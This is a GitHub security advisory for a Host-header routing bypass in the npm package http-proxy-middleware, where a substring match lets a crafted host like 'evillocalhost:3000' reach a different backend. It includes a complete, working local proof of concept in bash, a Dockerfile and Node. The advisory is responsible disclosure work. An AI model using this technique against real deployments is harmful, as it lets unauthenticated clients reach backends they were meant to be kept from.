# [M] http-proxy-middleware `router` host+path substring matching allows Host-header-driven backend routing bypass

## Summary
Severity: Medium
Advisory: GHSA-64mm-vxmg-q3vj
CVE: CVE-2026-55602
CWE: CWE-187, CWE-20
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-64mm-vxmg-q3vj
Type: github-advisory

## Affected
- npm: `http-proxy-middleware` — affected >=3.0.0 <3.0.6
- npm: `http-proxy-middleware` — affected >=4.0.0 <4.1.0
- npm: `http-proxy-middleware` — affected >=0.16.0 <2.0.10

## Details
# Summary

`http-proxy-middleware` documents `router` proxy-table entries as host, path, or host+path selectors, but the host+path implementation uses unanchored substring matching on attacker-controlled request metadata. As a result, a crafted `Host` header that is only a superstring match for a configured host+path key can still route a request to an unintended backend.

# Details

Tested code state:

- validated on tag `v4.0.0-beta.5`
- corresponding commit: `339f09ede860197807d4fd99ed9020fa5d0bd358`

Relevant code locations:

- `src/router.ts`
- `src/http-proxy-middleware.ts`

Affected public API:

- `createProxyMiddleware({ router: { 'host/path': 'http://target' } })`

Code explanation:

When a proxy-table router key contains `/`, `getTargetFromProxyTable()` concatenates attacker-controlled `req.headers.host` and `req.url` into a single `hostAndPath` string, then accepts the route if:

```ts
hostAndPath.indexOf(key) > -1
```

That is a substring test, not an exact host match plus intended path match. In the validated PoC, the configured router key is:

```txt
localhost:3000/api
```

but the attacker-controlled host is:

```txt
evillocalhost:3000
```

and the request path is:

```txt
/api
```

The concatenated attacker-controlled string:

```txt
evillocalhost:3000/api
```

still contains the configured router key as a substring, so the middleware selects the alternate backend even though the host is not equal to the configured host.

Exploit path:

1. the application enables the documented proxy-table `router` feature with at least one host+path rule
2. an external attacker sends an ordinary HTTP request with a crafted `Host` header
3. `HttpProxyMiddleware.prepareProxyRequest()` applies router selection before proxying
4. `getTargetFromProxyTable()` accepts the crafted `Host + path` string through substring matching
5. the request is proxied to the wrong backend

## PoC

Create these files in the same working directory and run:

```bash
bash ./run.sh
```

### File: `run.sh`

```bash
#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_URL="https://github.com/chimurai/http-proxy-middleware.git"
REPO_REF="v4.0.0-beta.5"
WORKDIR="$(mktemp -d "${SCRIPT_DIR}/.tmp-repro.XXXXXX")"
TARGET_REPO_DIR="${WORKDIR}/repo"
REPRO_DIR="${WORKDIR}/reproduction"
IMAGE_TAG="http-proxy-middleware-router-bypass-poc"

cleanup() {
  rm -rf "${WORKDIR}"
}
trap cleanup EXIT

echo "[a3] cloning target repository"
git clone --quiet "${REPO_URL}" "${TARGET_REPO_DIR}"
git -C "${TARGET_REPO_DIR}" checkout --quiet "${REPO_REF}"

mkdir -p "${REPRO_DIR}"
cp "${SCRIPT_DIR}/Dockerfile" "${WORKDIR}/Dockerfile"
cp "${SCRIPT_DIR}/verify.mjs" "${REPRO_DIR}/verify.mjs"

echo "[a3] building reproduction image"
docker build -f "${WORKDIR}/Dockerfile" -t "${IMAGE_TAG}" "${WORKDIR}"

echo "[a3] running verification"
docker run --rm "${IMAGE_TAG}" node /work/reproduction/verify.mjs
```

### File: `Dockerfile`

```Dockerfile
FROM node:22-bullseye

WORKDIR /work

COPY repo/package.json repo/yarn.lock /work/repo/

RUN corepack enable \
  && cd /work/repo \
  && yarn install --frozen-lockfile

COPY repo /work/repo
RUN cd /work/repo && yarn build

COPY reproduction /work/reproduction
```

### File: `verify.mjs`

```js
import http from 'node:http';
import fs from 'node:fs';
import assert from 'node:assert/strict';

import { createProxyMiddleware } from '/work/repo/dist/index.js';

const ROUTER_KEY = 'localhost:3000/api';
const CRAFTED_HOST = 'evillocalhost:3000';

function listen(server, port) {
  return new Promise((resolve) => {
    server.listen(port, '127.0.0.1', () => resolve());
  });
}

function close(server) {
  return new Promise((resolve, reject) => {
    server.close((err) => {
      if (err) {
        reject(err);
        return;
      }
      resolve();
    });
  });
}

function request(path, host) {
  return new Promise((resolve, reject) => {
    const req = http.request(
      {
        host: '127.0.0.1',
        port: 3000,
        path,
        method: 'GET',
        headers: {
          Host: host,
        },
      },
      (res) => {
        let data = '';
        res.setEncoding('utf8');
        res.on('data', (chunk) => {
          data += chunk;
        });
        res.on('end', () => {
          resolve({ statusCode: res.statusCode, body: data });
        });
      },
    );
    req.on('error', reject);
    req.end();
  });
}

const defaultBackend = http.createServer((req, res) => {
  res.end('DEFAULT');
});

const secretBackend = http.createServer((req, res) => {
  res.end('SECRET');
});

const proxyMiddleware = createProxyMiddleware({
  target: 'http://127.0.0.1:3101',
  router: {
    [ROUTER_KEY]: 'http://127.0.0.1:3102',
  },
});

const proxyServer = http.createServer((req, res) => {
  proxyMiddleware(req, res, () => {
    res.statusCode = 404;
    res.end('NO_PROXY');
  });
});

try {
  assert.ok(fs.existsSync('/work/repo/dist/index.js'));
  assert.ok(fs.existsSync('/work/reproduction/verify.mjs'));

  await listen(defaultBackend, 3101);
  await listen(secretBackend, 3102);
  await listen(proxyServer, 3000);
  console.log('STEP start-services ok');

  const baseline = await request('/api', 'safe.example:3000');
  assert.equal(baseline.statusCode, 200);
  assert.equal(baseline.body, 'DEFAULT');
  console.log(`STEP baseline-route body=${baseline.body}`);

  const crafted = await request('/api', CRAFTED_HOST);
  assert.equal(crafted.statusCode, 200);
  assert.equal(crafted.body, 'SECRET');
  assert.notEqual(CRAFTED_HOST, ROUTER_KEY.split('/')[0]);
  console.log(`STEP crafted-route body=${crafted.body}`);

  console.log('RESULT reproduced host_header_injection router substring match bypass');
} finally {
  await Promise.allSettled([close(proxyServer), close(defaultBackend), close(secretBackend)]);
}
```

This PoC starts:

- one default backend returning `DEFAULT`
- one alternate backend returning `SECRET`
- one proxy using:

```js
createProxyMiddleware({
  target: 'http://127.0.0.1:3101',
  router: {
    [ROUTER_KEY]: 'http://127.0.0.1:3102',
  },
});
```

It then sends:

1. a baseline request to `/api` with `Host: safe.example:3000`
2. a crafted request to `/api` with `Host: evillocalhost:3000`

Observed result from the validated PoC:

- baseline request: `STEP baseline-route body=DEFAULT`
- crafted request: `STEP crafted-route body=SECRET`
- success marker: `RESULT reproduced host_header_injection router substring match bypass`

The PoC is considered successful only if:

1. the baseline request stays on the default backend
2. the crafted request reaches the alternate backend
3. the crafted host is not equal to the configured router host

# Impact

This is a backend-selection integrity issue in a documented library feature. Applications that use host+path router-table rules for backend segmentation, tenant routing, or separation of public and more sensitive upstreams can have that routing boundary bypassed by an unauthenticated external client using an ordinary crafted `Host` header.

## References
- https://github.com/chimurai/http-proxy-middleware/security/advisories/GHSA-64mm-vxmg-q3vj
- https://github.com/chimurai/http-proxy-middleware
